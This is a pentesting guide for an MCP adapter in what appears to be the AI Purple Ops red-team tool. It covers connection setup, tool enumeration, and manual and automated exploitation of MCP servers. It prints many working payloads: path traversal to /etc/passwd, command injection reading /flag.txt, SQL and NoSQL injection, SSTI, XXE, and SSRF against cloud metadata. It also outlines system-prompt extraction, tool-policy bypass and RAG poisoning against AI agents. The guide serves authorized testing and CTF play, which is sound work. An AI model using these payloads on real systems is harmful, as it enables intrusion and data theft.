# MCP Adapter - Pentesting Guide

**For security professionals conducting red team assessments and CTF competitions**

The MCP (Model Context Protocol) adapter in AI Purple Ops enables direct security testing of MCP servers, tool calling APIs, and agentic backends. This guide covers everything from reconnaissance to full exploitation.

---

## Table of Contents

1. [Quick Start](#quick-start)
2. [Transport Configuration](#transport-configuration)
3. [Authentication Setup](#authentication-setup)
4. [Pentesting Workflow](#pentesting-workflow)
5. [CTF Competition Mode](#ctf-competition-mode)
6. [Exploitation Techniques](#exploitation-techniques)
7. [Burp Suite Integration](#burp-suite-integration)
8. [Troubleshooting](#troubleshooting)
9. [Advanced Topics](#advanced-topics)

---

## Quick Start

### 1. Create MCP Adapter Configuration

```bash
# Copy the template
cp adapters/templates/mcp.yaml adapters/target_mcp.yaml

# Edit configuration
vim adapters/target_mcp.yaml
```

### 2. Basic Configuration Example

```yaml
name: "target-mcp-server"
description: "Target MCP server for pentesting"

transport:
  type: http  # or websocket, stdio
  url: "https://api.target.com/mcp"
  timeout:
    connection: 30
    read: 120

auth:
  type: bearer
  token_env_var: "MCP_AUTH_TOKEN"

mode: target  # Server is attack target
```

### 3. Set Authentication Token

```bash
# Export auth token (never hardcode in config!)
export MCP_AUTH_TOKEN="sk-your-token-here"
```

### 4. Test Connection

```bash
# Verify connectivity and transport
aipop mcp test-connection adapters/target_mcp.yaml
```

### 5. Enumerate Attack Surface

```bash
# Discover all available tools
aipop mcp enumerate adapters/target_mcp.yaml --verbose
```

---

## Transport Configuration

The MCP adapter supports 3 transport types for different deployment scenarios.

### HTTP + SSE (Server-Sent Events)

**Use case:** Most common for API-based MCP servers

```yaml
transport:
  type: http
  url: "https://api.target.com/mcp"
  
  # Timeouts
  timeout:
    connection: 30   # Initial connection
    read: 120        # Response timeout
    write: 10        # Send request timeout
    idle: 300        # SSE stream inactivity
  
  # TLS settings
  verify_tls: true   # Set false only for self-signed certs (testing)
  
  # Retry configuration
  max_retries: 3
```

**Testing:**
```bash
aipop mcp test-connection config.yaml
```

### WebSocket

**Use case:** Persistent connections, real-time updates

```yaml
transport:
  type: websocket
  url: "wss://api.target.com/mcp"
  
  timeout:
    connection: 30
    read: 120
  
  verify_tls: true
  max_retries: 3
```

**Notes:**
- WebSocket connections stay open for multiple requests
- Better for CTF scenarios with interactive exploitation
- Supports binary payloads

### stdio (Standard Input/Output)

**Use case:** Local MCP servers, testing custom implementations

```yaml
transport:
  type: stdio
  command: ["python", "server.py"]
  cwd: "/path/to/mcp/server"
  
  timeout:
    connection: 30
    read: 120
```

**Example - Testing Local Server:**
```bash
# MCP server runs as subprocess
aipop mcp enumerate config_stdio.yaml
```

---

## Authentication Setup

### Bearer Token Authentication

**Most common:** API key in Authorization header

```yaml
auth:
  type: bearer
  token_env_var: "MCP_AUTH_TOKEN"  # RECOMMENDED: Use environment variable
  header_name: "Authorization"     # Default for bearer
```

**Set token:**
```bash
export MCP_AUTH_TOKEN="sk-abc123..."
```

### API Key Authentication

**Alternative:** Custom header with API key

```yaml
auth:
  type: api_key
  token_env_var: "API_KEY"
  header_name: "X-API-Key"  # Custom header name
```

### No Authentication

**Testing:** Unauthenticated endpoints

```yaml
auth:
  type: none
```

### Security Best Practices

❌ **NEVER do this:**
```yaml
auth:
  type: bearer
  token_value: "sk-hardcoded-token"  # INSECURE! Will be detected
```

✅ **Always do this:**
```yaml
auth:
  type: bearer
  token_env_var: "MCP_AUTH_TOKEN"  # Secure, not committed to git
```

---

## Pentesting Workflow

### Phase 1: Reconnaissance

#### 1.1 Test Connection
```bash
aipop mcp test-connection adapters/target.yaml
```

**Expected output:**
- Transport type confirmed
- Authentication validated
- Server version/capabilities

#### 1.2 Enumerate Tools
```bash
aipop mcp enumerate adapters/target.yaml --verbose
```

**What to look for:**
- Available tools/functions
- Parameter schemas (input validation)
- Descriptions (hints about functionality)
- Resources (file access, database connections)

**Example output:**
```
Available Tools:
  read_file
    Description: Read contents of a file
    Parameters:
      - path (string, required): File path to read
  
  execute_command
    Description: Execute system command
    Parameters:
      - command (string, required): Shell command
      - timeout (number, optional): Timeout in seconds
```

#### 1.3 Document Findings
```bash
# Save enumeration to file
aipop mcp enumerate adapters/target.yaml --output recon.json
```

### Phase 2: Manual Exploitation

#### 2.1 Direct Tool Invocation

**Test individual tools with crafted inputs:**

```bash
# Basic path traversal test
aipop mcp call adapters/target.yaml read_file \
  --params '{"path": "/etc/passwd"}'

# Command injection test
aipop mcp call adapters/target.yaml execute_command \
  --params '{"command": "id; cat /flag.txt"}'

# SQL injection test
aipop mcp call adapters/target.yaml search_database \
  --params '{"query": "' OR 1=1--"}'
```

#### 2.2 Payload Fuzzing

**Systematically test common exploits:**

```bash
# Path traversal payloads
aipop mcp call adapters/target.yaml read_file \
  --params '{"path": "../../../etc/passwd"}'

aipop mcp call adapters/target.yaml read_file \
  --params '{"path": "....//....//....//etc/passwd"}'

aipop mcp call adapters/target.yaml read_file \
  --params '{"path": "/etc/passwd\u0000.txt"}'  # Null byte injection

# Command injection payloads
aipop mcp call adapters/target.yaml execute_command \
  --params '{"command": "echo test;cat /flag.txt"}'

aipop mcp call adapters/target.yaml execute_command \
  --params '{"command": "`cat /flag.txt`"}'

aipop mcp call adapters/target.yaml execute_command \
  --params '{"command": "$(cat /flag.txt)"}'
```

### Phase 3: Automated Exploitation

#### 3.1 Auto-Exploit Mode

**Let AI Purple Ops solve the challenge automatically:**

```bash
# Objective-based exploitation
aipop mcp exploit adapters/target.yaml \
  --objective "Extract the CTF flag from the server"

# With specific target
aipop mcp exploit adapters/target.yaml \
  --objective "Find and read the file containing 'flag{'"
```

**How it works:**
1. Enumerates all available tools
2. Analyzes tool descriptions and parameters
3. Generates exploitation payloads from 200+ payload library
4. Automatically detects flags/secrets in responses
5. Adapts strategy based on errors
6. Multi-turn state tracking

#### 3.2 Flag Detection

**Automatic detection of:**
- `flag{...}` - Standard CTF format
- `CTF{...}` - Alternative format
- `[FLAG]...[/FLAG]` - Wrapped format
- API keys (sk-..., xoxb-...)
- AWS keys (AKIA...)
- SSH private keys
- JWT tokens
- Environment variables

**Output:**
```
[FLAG DETECTED] flag{mcp_server_pwn3d}
[SECRET DETECTED] AWS_ACCESS_KEY_ID=AKIA...
```

### Phase 4: Evidence Collection

All MCP operations automatically log:
- Full request/response transcripts
- Tool calls with parameters
- Flags and secrets discovered
- Error messages (often contain hints)
- Timing data

**Access transcripts:**
```bash
ls out/transcripts/mcp_*.json
```

---

## CTF Competition Mode

### Quick CTF Commands

AI Purple Ops provides shortcut commands for common CTF scenarios:

#### MCP Command Injection
```bash
aipop ctf mcp-inject \
  --target https://ctf.example.com/mcp \
  --token $CTF_TOKEN
```

**Attacks:**
- Command injection in tool parameters
- Shell metacharacter injection
- Command substitution (backticks, $())

#### System Prompt Extraction
```bash
aipop ctf extract-prompt \
  --target config.yaml
```

**Techniques:**
- Meta-questions ("What are your instructions?")
- Summarization tricks
- Gradual extraction

#### Tool Policy Bypass
```bash
aipop ctf tool-bypass \
  --target config.yaml \
  --forbidden-tool execute_command
```

**Bypasses:**
- Parameter manipulation
- Function aliasing
- Permission elevation

### CTF Strategy Selection

```bash
# List all strategies
aipop ctf list

# Run specific strategy
aipop ctf attack mcp-inject \
  --config adapters/target.yaml \
  --output ctf_results/
```

**6 Built-in Strategies:**
1. **mcp-inject** - MCP command injection
2. **extract-prompt** - System prompt extraction
3. **indirect-inject** - RAG/context poisoning
4. **tool-bypass** - Tool policy bypass
5. **context-overflow** - Context window manipulation
6. **rag-poison** - Vector database poisoning

---

## Exploitation Techniques

### Path Traversal

**Goal:** Read arbitrary files outside intended directory

```bash
# Standard traversal
--params '{"path": "../../../etc/passwd"}'

# URL encoding
--params '{"path": "..%2F..%2F..%2Fetc%2Fpasswd"}'

# Double encoding
--params '{"path": "..%252F..%252F..%252Fetc%252Fpasswd"}'

# Mixed separators (Windows)
--params '{"path": "..\\..\\..\\windows\\system32\\config\\sam"}'

# Null byte injection (bypass extension checks)
--params '{"path": "/etc/passwd\u0000.txt"}'

# Absolute path
--params '{"path": "/flag.txt"}'
```

### Command Injection

**Goal:** Execute arbitrary shell commands

```bash
# Semicolon separator
--params '{"command": "ls;cat /flag.txt"}'

# AND operator
--params '{"command": "echo test && cat /flag.txt"}'

# OR operator
--params '{"command": "false || cat /flag.txt"}'

# Backticks
--params '{"command": "echo `cat /flag.txt`"}'

# $() substitution
--params '{"command": "echo $(cat /flag.txt)"}'

# Newline injection
--params '{"command": "echo test\ncat /flag.txt"}'

# Pipe
--params '{"command": "echo test | cat /flag.txt"}'
```

### SQL Injection

**Goal:** Manipulate database queries

```bash
# Boolean-based
--params '{"query": "' OR 1=1--"}'

# UNION injection
--params '{"query": "' UNION SELECT flag FROM secrets--"}'

# Time-based blind
--params '{"query": "'; WAITFOR DELAY '00:00:05'--"}'

# Information schema enumeration
--params '{"query": "' UNION SELECT table_name FROM information_schema.tables--"}'
```

### NoSQL Injection (MongoDB)

```bash
# $ne operator
--params '{"username": {"$ne": null}, "password": {"$ne": null}}'

# $regex operator
--params '{"username": {"$regex": ".*"}}'

# $where injection
--params '{"username": {"$where": "this.password.length > 0"}}'
```

### Server-Side Template Injection (SSTI)

```bash
# Jinja2 (Python)
--params '{"template": "{{7*7}}"}'
--params '{"template": "{{config.items()}}"}'

# ERB (Ruby)
--params '{"template": "<%= 7*7 %>"}'

# FreeMarker (Java)
--params '{"template": "${7*7}"}'
```

### XML External Entity (XXE)

```bash
--params '{
  "xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
}'
```

### Server-Side Request Forgery (SSRF)

```bash
# Localhost access
--params '{"url": "http://127.0.0.1:8080/admin"}'

# Cloud metadata
--params '{"url": "http://169.254.169.254/latest/meta-data/"}'

# File protocol
--params '{"url": "file:///etc/passwd"}'
```

---

## Burp Suite Integration

### Proxy Traffic Through Burp

**Route all MCP traffic through Burp Suite for analysis:**

```yaml
transport:
  type: http
  url: "https://api.target.com/mcp"
  proxy: "http://127.0.0.1:8080"  # Burp proxy
  verify_tls: false  # Burp uses self-signed cert
```

**Command line:**
```bash
aipop mcp enumerate adapters/target.yaml --proxy http://127.0.0.1:8080
```

### Burp Suite Setup

1. **Start Burp Suite**
   - Proxy tab → Options
   - Listen on 127.0.0.1:8080

2. **Configure Interception**
   - Proxy → Intercept → Intercept is on
   - View/modify MCP requests in real-time

3. **Use Repeater**
   - Right-click request → Send to Repeater
   - Manual testing with parameter modification

### Quick Adapter from Burp

**Convert Burp request to AI Purple Ops adapter:**

1. Right-click request → Copy as cURL
2. Generate adapter:
   ```bash
   aipop adapter quick --name target \
     --from-curl 'curl "https://api.target.com/mcp" -H "Authorization: Bearer ..."'
   ```

### Traffic Analysis

**Inspect MCP protocol in Burp:**
- HTTP tab: View JSON-RPC requests
- WebSockets tab: View WS frames
- Logger: Full request/response history

---

## Troubleshooting

### Connection Issues

**Problem:** "Connection refused"

**Solutions:**
```bash
# Verify URL is correct
curl -v https://api.target.com/mcp

# Check transport type matches server
# HTTP servers won't accept WebSocket connections

# Increase timeout
# Edit config: timeout.connection: 60
```

**Problem:** "SSL certificate verification failed"

**Solution:**
```yaml
transport:
  verify_tls: false  # Only for testing!
```

### Authentication Issues

**Problem:** "401 Unauthorized"

**Solutions:**
```bash
# Verify token is set
echo $MCP_AUTH_TOKEN

# Check token format
# Bearer: "Authorization: Bearer sk-..."
# API Key: "X-API-Key: abc123..."

# Test manually
curl -H "Authorization: Bearer $MCP_AUTH_TOKEN" \
  https://api.target.com/mcp
```

**Problem:** "Token expired"

**Solution:**
```bash
# Refresh token and re-export
export MCP_AUTH_TOKEN="new-token-here"
```

### Tool Invocation Issues

**Problem:** "Tool not found"

**Solution:**
```bash
# Enumerate to get exact tool names
aipop mcp enumerate adapters/target.yaml

# Tool names are case-sensitive
# Use exact name from enumeration
```

**Problem:** "Invalid parameters"

**Solution:**
```bash
# Check parameter schema
aipop mcp enumerate adapters/target.yaml --verbose

# Ensure JSON syntax is valid
# Use proper types (string vs number)
echo '{"path": "/etc/passwd"}' | jq .  # Validate JSON
```

### Response Parsing Issues

**Problem:** "No flag detected"

**Solution:**
```bash
# Check transcript for actual response
cat out/transcripts/mcp_call_*.json | jq .

# Flag might be encoded
# Base64: ZmxhZ3suLi59
# Hex: 666c61677b...7d

# Flag might be in error message
# Error responses often leak information
```

---

## Advanced Topics

### Rate Limiting

**Avoid detection and respect server limits:**

```yaml
rate_limit:
  max_concurrent: 5          # Parallel requests
  respect_headers: true      # Honor X-RateLimit-* headers
  rpm_limit: 60              # Custom rate limit
```

### Tool Whitelisting/Blacklisting

**Control which tools can be called:**

```yaml
safety:
  tool_whitelist: ["read_file", "search_database"]  # Only these
  # OR
  tool_blacklist: ["delete_*", "drop_*"]  # Exclude these
```

### Dry Run Mode

**Enumerate without executing:**

```yaml
safety:
  dry_run: true  # Discover tools but don't call them
```

### Payload Customization

**Use custom payload library:**

```bash
# Create custom payloads
cat > custom_payloads.json <<EOF
{
  "path_traversal": [
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "/etc/passwd\u0000"
  ],
  "command_injection": [
    ";cat /flag.txt",
    "\$(cat /flag.txt)"
  ]
}
EOF

# Reference in exploitation
aipop mcp exploit adapters/target.yaml \
  --payloads custom_payloads.json
```

### Multi-Stage Exploitation

**Chain multiple tool calls:**

```bash
# 1. Enumerate files
aipop mcp call adapters/target.yaml list_directory \
  --params '{"path": "/"}' > files.txt

# 2. Read interesting files
grep "flag" files.txt | while read file; do
  aipop mcp call adapters/target.yaml read_file \
    --params "{\"path\": \"$file\"}"
done
```

### Scripted Exploitation

**Python automation:**

```python
from harness.adapters.mcp_adapter import MCPAdapter

# Load adapter
adapter = MCPAdapter.from_file("adapters/target.yaml")

# Enumerate
tools = adapter.enumerate_tools()
print(f"Found {len(tools)} tools")

# Exploit
for payload in path_traversal_payloads:
    result = adapter.call_tool("read_file", {"path": payload})
    if "flag{" in result:
        print(f"FLAG FOUND: {result}")
        break
```

---

## Real-World Examples

### Example 1: CTF Flag Extraction

```bash
# 1. Quick recon
aipop mcp enumerate ctf.yaml

# 2. Auto-exploit
aipop mcp exploit ctf.yaml --objective "Find the flag"

# Output:
# [FLAG DETECTED] flag{mcp_server_vulnerable}
```

### Example 2: Systematic Path Traversal

```bash
# Common flag locations
for path in \
  "/flag.txt" \
  "/home/ctf/flag.txt" \
  "/var/www/flag.txt" \
  "/tmp/flag.txt" \
  "../flag.txt"; do
  
  echo "Testing: $path"
  aipop mcp call target.yaml read_file \
    --params "{\"path\": \"$path\"}" 2>&1 | grep -i flag
done
```

### Example 3: Command Injection Fuzzing

```bash
# Test multiple injection techniques
for cmd in \
  "ls;cat /flag.txt" \
  "ls\`cat /flag.txt\`" \
  "ls\$(cat /flag.txt)" \
  "ls||cat /flag.txt"; do
  
  echo "Testing: $cmd"
  aipop mcp call target.yaml execute_command \
    --params "{\"command\": \"$cmd\"}"
done
```

---

## Security Considerations

### Responsible Disclosure

- Only test systems you have permission to assess
- Follow bug bounty program rules
- Report vulnerabilities responsibly
- Don't share exploits publicly without vendor fix

### Legal Compliance

- Computer Fraud and Abuse Act (CFAA) applies
- Unauthorized access is illegal
- Get written authorization before testing
- Respect scope limitations

### Ethical Testing

- Don't cause damage or data loss
- Don't pivot to internal networks
- Don't exfiltrate sensitive data
- Stop testing if you find critical vulns

---

## Additional Resources

- **MCP Protocol Specification:** https://spec.modelcontextprotocol.io/
- **Payload Database:** `src/harness/ctf/strategies/payloads/mcp_exploits.json`
- **Example Configs:** `adapters/templates/mcp.yaml`
- **CTF Strategies:** `aipop ctf list`

---

## Support

For issues or questions:
- GitHub Issues: https://github.com/Kennyslaboratory/AI-Purple-Ops/issues
- Documentation: https://github.com/Kennyslaboratory/AI-Purple-Ops/tree/main/docs

---

**Happy Hacking! 🔓**

*Remember: With great power comes great responsibility. Use these techniques ethically.*

